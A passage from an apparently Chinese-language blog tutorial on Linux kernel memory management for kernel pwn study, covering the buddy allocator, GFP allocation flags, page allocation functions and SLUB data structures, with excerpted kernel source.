                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/free_area.png"
                      alt="free_area"
                ></p>
<p><strong>page</strong></p>
<p>我们不难看出：<code>free_area</code> 的 <code>free_list</code> 字段便是用以存放指向空闲页面的指针，其通过 <code>page</code> 结构体的 <code>lru</code> 字段将 <code>page</code> 结构体连接成双向链表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * @lru: Pageout list, eg. active_list protected by</span></span><br><span class="line"><span class="comment">			 * zone_lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment">			 * by the page owner.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br></pre></td></tr></table></figure></div>

<p><code>page</code> 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<code>free_list</code> 与 <code>lru</code> 链表都使用该字段 将页结构体组织为双向链表，即一个页是不可能同时出现在 <code>lru</code> 链表与 <code>buddy system</code> 中的。</p>
<p><strong>alloc_context</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span>	<span class="comment">/* Pointer to actual zone */</span></span><br><span class="line">	<span class="type">int</span> zone_idx;		<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line">	<span class="type">nodemask_t</span> *nodemask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line">	<span class="type">int</span> migratetype;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">high_zoneidx</span>;</span></span><br><span class="line">	<span class="type">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>alloc_context</code> 数据结构是一个内部临时使用的数据结构。</p>
<ul>
<li><code>zonelist</code> 指向每一个内存节点中对应的 <code>zonelist</code>；</li>
<li><code>nodemask</code> 表示内存节点的掩码；</li>
<li><code>preferred_zoneref</code> 表示首选 <code>zone</code> 的 <code>zoneref</code>;</li>
<li><code>migratetype</code> 表示迁移类型；</li>
<li><code>high_zoneidx</code> 分配掩码计算 <code>zone</code> 的 <code>zoneidx</code>,表示这个分配掩码允许内存分配的最高 <code>zone</code>；</li>
<li><code>spread_dirty_pages</code> 用于指定是否传播脏页。</li>
</ul>
<h5 id="分配掩码"><a href="#分配掩码" class="headerlink" title="分配掩码"></a>分配掩码</h5><p>分配掩码是描述页面分配方法的标志，它影响着页面分配的整个流程。因为 Linux 内核是一个通用的操作系统，所以页面分配器被设计成一个复杂的系统。它既要高效，又要兼顾很多种情况，特别是在内存紧张的情况下的内存分配。<code>gfp_mask</code> 其实被定义成一个 <code>unsigned</code> 类型的变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> __bitwise <span class="type">gfp_t</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>内存管理区修饰符(zone modifier)。</li>
<li>移动修饰符（mobility and placement modifier)。</li>
<li>水位修饰符（watermark modifier)。</li>
<li>页面回收修饰符(page reclaim modifier)。</li>
<li>行为修饰符(action modifier)。</li>
</ul>
<p><strong>内存管理区修饰符</strong></p>
<p>内存管理区修饰符主要用于表示应当从哪些内存管理区中来分配物理内存。内存管理区修饰符使用<code>gfp_mask</code> 的低 4 位来表示。</p>
<ul>
<li><code>___GFP_DMA</code>：从 <code>ZONE_DMA</code> 中分配内存</li>
<li><code>___GFP_DMA32</code>：从 <code>ZONE_DMA32</code> 中分配内存</li>
<li><code>___GFP _HIGHMEM</code>：优先从 <code>ZONE_HIGHMEM</code> 中分配内存</li>
<li><code>___GFP_MOVABLE</code>：页面可以被迁移或者回收，如用于内存规整机制</li>
</ul>
<p><strong>移动修饰符</strong></p>
<p>移动修饰符主要用于指示分配出来的页面具有的迁移属性。在 Linux2.6.24 内核中，为了解决外碎片化的问题，引入了迁移类型，因此在分配内存时需要指定所分配的页面具有哪些迁移属性。</p>
<ul>
<li><code>___GFP_RECLAIMABLE</code>：在 slab 分配器中指定了 <code>SLAB_RECLAIM_ACCOUNT</code> 标志位，表示 slab 分配器中使用的页面可以通过收割机来回收</li>
<li><code>___GFP_HARDWALL</code>：使能 cpusect 内存分配策略</li>
<li><code>___GFP_THISNODE</code>：从指定的内存节点中分配内存，并且没有回退机制</li>
<li><code>___GFP_ACCOUNT</code>：分配过程会被 kmemcg 记录</li>
</ul>
<p><strong>水位修饰符</strong></p>
<p>水位修饰符用于控制是否可以访问系统预留的内存。所谓系统预留内存指的是最低警戒水位以下的内存，一般优先级的分配请求是不能访问它们的，只有高优先级的分配请求才能访问，如 <code>___GFP_HIGH</code> 、<code>___GFP_ATOMIC</code> 等。</p>
<ul>
<li><code>___GFP_HIGH</code>：表示分配内存具有高优先级，并且这个分配请求是很有必要的，分配器可以使用系统预留的内存(即最低警戒水位线下的预留内存)</li>
<li><code>___GFP_ATOMIC</code>：表示分配内存的过程不能执行页面回收或者睡眠动作，并且具有很高的优先级，可以访问系统预留的内存。常见的一个场景是在中断上下文中分配内存</li>
<li><code>___GFP_MEMALLOC</code>：分配过程中允许访问所有的内存，包括系统预留的内存。分配内存进程通常要保证在分配内存过程中很快会有内存被释放，如进程退出或者页面回收</li>
<li><code>___GFP_NOMEMALLOC</code>：分配过程不允许访问系统预留的内存</li>
</ul>
<p><strong>页面回收修饰符</strong></p>
<ul>
<li><code>___GFP_IO</code>：允许开启I&#x2F;O传输</li>
<li><code>___GFP_FS</code>：允许调用底层的文件系统。这个标志清零通常是为了避免死锁的发生，如果相应的文件系统操作路径上已经持有了锁，分配内存过程又递归地调用这个文件系统的相应操作路径，可能会产生死锁</li>
<li><code>___GFP_DIRECT_RECLAIM</code>：分配内存的过程中允许使用页面直接回收机制</li>
<li><code>___GFP_KSWAPD_RECLAIM</code>：表示当到达内存管理区的低水位时会唤醒 kswapd 内核线程，以异步地回收内存，直到内存管理区恢复到了高水位为止</li>
<li><code>___GFP_RECLAIM</code>：用于允许或者禁止直接页面回收和 kswapd 内核线程</li>
<li><code>___GFP_REPEAT</code>：当分配失败时会继续尝试</li>
<li><code>___GFP_NOFAIL</code>：当分配失败时会无限地尝试下去，直到分配成功为止。当分配者希望分配内存不失败时，应该使用这个标志位，而不是自己写一个 while 循环来不断地调用页面分配接口函数</li>
<li><code>___GFP_NORETRY</code>：当使用了直接页面回收和内存规整等机制还无法分配内存时，最好不要重复尝试分配了，直接返回 NULL</li>
</ul>
<p><strong>行为修饰符</strong></p>
<ul>
<li><code>___GFP_COLD</code>：分配的内存不会马上被使用。通常会返回一个空的高速缓存页面</li>
<li><code>___GFP_NOWARN</code>：关闭分配过程中的一些错误报告</li>
<li><code>___GFP_ZERO</code>：返回一个全部填充为 0 的页面</li>
<li><code>___GFP_NOTRACK</code>：不被kmemcheck 机制跟踪</li>
<li><code>___GFP_OTHER NODE</code>：在远端的一个内存节点上分配。通常在 khugepaged 内核线程中使用</li>
</ul>
<p><strong>类型标志</strong></p>
<p>前文列出了 5 大类修饰符的标志，对于内核开发者或者驱动开发者来说，要正确使用这些标志是一件很困难的事情，因此定义了一些常用的标志的组合—类型标志（type flag)</p>
<ul>
<li><code>GFP_KERNEL(__GFP_RECLAIM | __GFP_IO | __GFP_FS)</code>：内核分配内存常用的标志之一。它可能会被阻塞，即分配过程中可能会睡眠</li>
<li><code>GFP_ATOMIC(__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM)</code>：调用者不能睡眠并且保证分配会成功。它可以访问系统预留的内存</li>
<li><code>GFP_NOWAIT(__GFP_KSWAPD_RECLAIM)</code>：分配中不允许睡眠等待</li>
<li><code>GFP_NOFS(__GFP_RECLAIM | __GFP_IO)</code>：不会访问任何的文件系统的接口和操作</li>
<li><code>GFP_NOIO(__GFP_RECLAIM)</code>：不需要启动任何的 I&#x2F;O 操作。如使用直接回收机制丢弃干净的页面或者为 slab 分配的页面</li>
<li><code>GFP_USER(__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL)</code>：通常用户空间的进程用来分配内存，这些内存可以被内核或者硬件使用。常用的、一个场景是硬件使用的 DMA 缓冲器要映射到用户空间，如显卡的缓冲器</li>
<li><code>GFP_DMA/GFP_DMA32(__GFP_DMA/__GFP_DMA32)</code>：使用 <code>ZONE_DMA</code> 或者 <code>ZONE_DMA32</code> 来分配内存</li>
<li><code>GFP_HIGHUSER(GFP_USER | __GFP_HIGHMEM)</code>：用户空间进程用来分配内存，优先使用 <code>ZONE_HIGHMEM</code> ，这些内存可以映射到用户空间，内核空间不会直接访问这些内存。另外，这些内存不能迁移</li>
<li><code>GFP_HIGHUSER_MOVABLE(GFP_HIGHUSER | __GFP_MOVABLE)</code>：类似于 <code>GFP_HIGHUSER</code> ，但是页面可以迁移</li>
<li><code>GFP_TRANSHUGE/GFP_TRANSHUGE_LIGHT((GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM)/((GFP_HIGHUSER_MOVABLE | __GFP_COMP |  __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM))</code>：通常用于透明页面分配</li>
</ul>
<blockquote>
<p>这些符号的定义保存在源码&#x2F;source&#x2F;include&#x2F;linux&#x2F;gfp.h 里面。</p>
</blockquote>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p><strong>分配物理页面</strong></p>
<ul>
<li><p><code>alloc_pages</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> page *<span class="title function_">alloc_pages</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order)</span>;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><code>alloc_pages()</code> 函数用来分配2^order个连续的物理页面，返回值是第一个物理页面的 <code>page</code> 数据结构。第一个参数是 <code>gfp_mask</code>；第二个参数是 <code>order</code> ，请求的 <code>order</code> 需要小于 <code>MAX_ORDER</code> ，<code>MAX_ORDER</code> 通常默认是 11 。</p>
</li>
<li><p><code>__get_free_pages</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __get_free_pages(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order);</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><code>_get_free_pages()</code> 函数返回的是所分配内存的内核空间虚拟地址。如果所分配内存是线性映射的物理内存，则直接返回线性映射区域的内核空间虚拟地址；<code>_get_free _pages()</code> 函数不会使用高端内存，如果一定需要使用高端内存，最佳的办法是使用 <code>alloc_pages()</code> 函数以及 <code>kmap()</code> 函数。注意，在 64 位处理器的 Linux 内核中没有高端内存这个概念，它只实现在 32 位处理器的Linux内核中。</p>
</li>
<li><p>分配一个物理页面<br>如果需要分配一个物理页面，可以使用如下两个封装好的接口函数，它们最后仍调用 <code>alloc_pages()</code> ，只是 <code>order</code> 的值为 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_page(gfp_mask) alloc_pages(gfp_mask, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __get_free_page(gfp_mask) \</span></span><br><span class="line"><span class="meta">		__get_free_pages((gfp_mask), 0)</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>如果需要返回一个全填充为 0 的页面，可以使用如下接口函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">get_zeroed_page</span><span class="params">(<span class="type">gfp_t</span> gfp_mask)</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>释放页面</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __free_pages(<span class="keyword">struct</span> page *page, <span class="type">unsigned</span> <span class="type">int</span> order);</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">int</span> order)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __free_page(page) __free_pages((page), 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> free_page(addr) free_pages((addr), 0)</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>释放时需要特别注意参数，传递错误的 <code>page</code> 指针或者错误的 <code>order</code> 值会引起系统崩溃。<code>free pages()</code> 函数的第一个参数是待释放页面的 <code>page</code> 指针，第二个参数是 <code>order</code> 。 <code>__free _page()</code> 函数用于释放单个页面。</p>
<h4 id="slub"><a href="#slub" class="headerlink" title="slub"></a>slub</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/slub_allocator.png"
                      alt="slub_allocator"
                ></p>
<h5 id="相关数据结构-1"><a href="#相关数据结构-1" class="headerlink" title="相关数据结构"></a>相关数据结构</h5><p><code>kmem_cache</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 每个 CPU 的内存缓存的抽象 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">    <span class="comment">/* 每个对象本身元数据及包括对齐信息后所占据的内存长度 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">    <span class="comment">/* 每个对象本身元数据所占用的内存长度，创建 kmem_cache 时候传递进来的参数 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">    <span class="comment">/* 本地缓存池的空闲对象门槛值，超过这个值，就需要做释放动作 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 存放最优 slab 的阶数和对象数量。高16bit 是 slab 阶数，低 16bit 是 slab 中包含的对象数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">    <span class="comment">/* 理论存放最大slab的阶数和对象数量，存放格式与 oo 一致。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">/* 存放最小 slab 的阶数和对象数量，存放格式与 oo 一致。最优 slab 方案无法实现，那么就会尝试最小 slab 的方案 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">    <span class="comment">/* 表示 kmem_cache 是否处于使用状态 */</span></span><br><span class="line">	<span class="type">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>kmem_cache_cpu</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 指向下一个可用的 object */</span></span><br><span class="line">	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">    <span class="comment">/* 用于做内核同步的 ID */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">    <span class="comment">/* 当前 CPU 正在访问的 slab 的首页 page 的地址 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *	<span class="title">page</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">/* 本地 slab 部分空闲链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>kmem_cache_node</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 自旋锁 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">    <span class="comment">/* 当前内存节点所包含 slab 的数量 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">    <span class="comment">/* 内存节点的 slab partial 链表，slub 对共享缓存，只用一条部分空闲链表管理 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="type">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>slab 以页为基本单位切割，然后用单向链表(fd指针)串起来，类似用户态堆的 fastbin，每一个小块我们叫它 object 。</p>
<p><strong>注意：object 的 freelist 指针偏移是 kmem_cache.offset 而不是 0，虽然大多数情况 kmem_cache.offset 默认为 0 。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>object</code> 结构如下图所示：<br> <img  
                     lazyload
                     src="/images/loading.svg"
